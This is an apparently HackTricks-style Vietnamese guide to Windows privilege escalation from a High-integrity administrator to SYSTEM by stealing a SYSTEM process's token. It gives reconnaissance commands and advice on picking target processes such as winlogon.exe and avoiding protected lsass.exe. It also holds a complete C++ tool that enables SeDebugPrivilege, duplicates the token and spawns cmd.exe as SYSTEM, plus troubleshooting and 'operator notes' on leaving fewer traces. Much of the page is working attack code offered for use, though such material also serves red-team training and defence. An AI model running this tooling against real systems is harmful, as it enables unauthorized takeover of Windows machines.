# SeImpersonate từ High lên System

{{#include ../../banners/hacktricks-training.md}}

Trang này nói về cách **thủ công** chuyển từ **tiến trình quản trị viên có mức toàn vẹn High** sang **`NT AUTHORITY\SYSTEM`** bằng cách **mở một tiến trình SYSTEM không được bảo vệ, sao chép token của tiến trình đó và khởi chạy tiến trình con bằng token ấy**.

Nếu bạn chỉ có **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** nhưng **không thể mở một tiến trình SYSTEM phù hợp**, phương pháp **Potato / named-pipe** thường đáng tin cậy hơn:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Nếu bạn không chỉ cần `SYSTEM` mà còn muốn có **token SYSTEM với nhiều đặc quyền nhất có thể**, hãy xem thêm:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Kiểm tra nhanh

Trước khi thử đánh cắp token, hãy nhanh chóng xác minh ngữ cảnh:

```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```

Ghi chú thực tế:

- Admin token có **High Integrity** thường đủ để **bật `SeDebugPrivilege`** và mở nhiều tiến trình SYSTEM không được bảo vệ.
- `CreateProcessWithTokenW` yêu cầu caller có **`SeImpersonatePrivilege`**. Nếu API đó trả về lỗi `1314`, hãy chuyển sang `CreateProcessAsUserW` sau khi đã duplicate một SYSTEM primary token.
- Trên Windows hiện đại, **`lsass.exe` thường là mục tiêu không phù hợp** vì **LSA protection / PPL** chặn truy cập ngay cả với administrator có `SeDebugPrivilege`. Hãy ưu tiên **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** hoặc một **`svchost.exe`** chạy sớm với quyền SYSTEM.
- Không phải tiến trình SYSTEM nào cũng có token hữu ích như nhau. Nếu bạn có SYSTEM nhưng nhận thấy thiếu privilege, hãy thử một tiến trình SYSTEM khác thay vì cho rằng kỹ thuật này bị lỗi.

## Chọn PID cẩn thận

Cách dễ nhất để kỹ thuật này hoạt động ổn định là **chọn một tiến trình SYSTEM có DACL thực sự cho phép Administrators truy vấn tiến trình và duplicate token của nó**.

Các mục tiêu tốt nên thử trước:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- một số instance `svchost.exe` khởi chạy sớm, chạy với quyền SYSTEM

Mặc định nên tránh:

- `lsass.exe` trên các máy chủ đã bật **RunAsPPL / LSA protection**
- các tiến trình được bảo vệ / nhạy cảm về bảo mật, trả về `Access denied` ngay cả sau khi bật `SeDebugPrivilege`

Bạn có thể kiểm tra các tiến trình mục tiêu cùng token/ACL của chúng bằng **Process Explorer** hoặc **Process Hacker** đang chạy elevated.

### Code

Đoạn code sau lấy từ [bài viết về access token này](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Đoạn code nhận **process ID làm đối số** và khởi chạy command shell **với tư cách người dùng** của tiến trình đó.<sup>[[3]](#references)</sup>\
Khi chạy trong tiến trình High Integrity, bạn có thể **chỉ định PID của một tiến trình đang chạy với quyền System** (như `winlogon`, `wininit`) rồi thực thi `cmd.exe` với quyền SYSTEM.<sup>[[3]](#references)</sup>

```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}
	return TRUE;
}
std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}
int main(int argc, char** argv) {
	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", (get_username()).c_str());
	// Grab PID from command line argument
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
		printf("[+] Reverting thread to original user context\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}
	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}
	// Call CreateProcessWithTokenW(), print return code and error code
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}
	return 0;
}
```

## Lưu ý hữu ích về API / quyền truy cập

Ví dụ sử dụng `MAXIMUM_ALLOWED`, nhưng với các thao tác thực tế, cần nhớ những thành phần tối thiểu sau:

- `OpenProcessToken()` chỉ yêu cầu **process handle** được mở với **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Để sử dụng `CreateProcessWithTokenW()`, **primary token handle** phải có **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` phải tạo một **primary token** (`TokenPrimary`), không chỉ là impersonation token.
- Nếu bạn đã impersonate SYSTEM mà `CreateProcessWithTokenW()` vẫn thất bại với lỗi `1314`, hãy thử dùng `CreateProcessAsUserW()`.

Điều đó có nghĩa là **thường không cần mở target process với `PROCESS_ALL_ACCESS` và việc này cũng gây nhiều dấu vết hơn** so với chỉ yêu cầu các quyền cần thiết để truy vấn token.

## Lỗi

Đôi khi bạn có thể thử impersonate System nhưng không thành công, và thấy đầu ra như sau:

```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```

Điều này có nghĩa là ngay cả khi bạn đang chạy ở mức **toàn vẹn cao**, bạn **không có đủ quyền** đối với tiến trình/token mục tiêu đó.\
Hãy kiểm tra quyền hiện tại của Administrator đối với các tiến trình `svchost.exe` bằng **Process Explorer** (hoặc bạn cũng có thể dùng **Process Hacker**):

1. Chọn một tiến trình `svchost.exe`
2. Nhấp chuột phải --> Properties
3. Trong tab "Security", nhấp vào nút "Permissions" ở góc dưới bên phải
4. Nhấp vào "Advanced"
5. Chọn "Administrators" rồi nhấp vào "Edit"
6. Nhấp vào "Show advanced permissions"

![Code - Lỗi: 6. Nhấp vào "Show advanced permissions"](<../../images/image (437).png>)

Hình ảnh trên chứa tất cả quyền mà "Administrators" có đối với tiến trình đã chọn (như bạn thấy, trong trường hợp `svchost.exe`, họ chỉ có quyền "Query")

Xem các quyền mà "Administrators" có đối với `winlogon.exe`:

![Code - Lỗi: Xem các quyền mà "Administrators" có đối với winlogon.exe](<../../images/image (1102).png>)

Trong tiến trình đó, "Administrators" có thể "Read Memory" và "Read Permissions", điều này có thể cho phép Administrators impersonate token mà tiến trình này sử dụng.

### Các nguyên nhân thường gặp khiến thất bại

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL của tiến trình chặn bạn hoặc mục tiêu là **protected/PPL**. Hãy chọn một tiến trình SYSTEM khác.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: handle token của bạn được mở mà không có đủ quyền, hoặc DACL của token mục tiêu ngăn việc sao chép.
- **`CreateProcessWithTokenW()` -> `1314`**: caller hiện không bật **`SeImpersonatePrivilege`**. Hãy thử bật quyền này trước hoặc dùng `CreateProcessAsUserW()` với primary token đã sao chép.
- **`CreateProcessWithTokenW()` -> `1326`** sau các lần thất bại trước đó: điều này thường chỉ có nghĩa là bước sao chép/impersonation token trước đó đã thất bại, nên không có primary token khả dụng để khởi chạy tiến trình con.

## Ghi chú cho operator

- Kỹ thuật này rất hữu ích khi bạn đã có **local admin + mức toàn vẹn cao** và chỉ muốn có cách nhanh chóng, thực hiện thủ công để lên SYSTEM mà không cần chạy service hoặc dựng chuỗi named-pipe coercion.
- Trong các môi trường Windows 11 / Server được harden, **LSA protection ngày càng phổ biến**, vì vậy quy trình giả định rằng `lsass.exe` luôn có thể đọc được sẽ không đáng tin cậy. **`winlogon.exe` / `wininit.exe` / `services.exe` thường là những lựa chọn đầu tiên tốt hơn**.<sup>[[2]](#references)</sup>
- Nếu bạn có được ngữ cảnh của **service account** thay vì desktop admin đã elevated, **họ Potato** thường phù hợp hơn trang này.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Lạm dụng token của Windows để xâm nhập Active Directory mà không đụng đến LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Tìm hiểu và lạm dụng Process Token — Phần II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
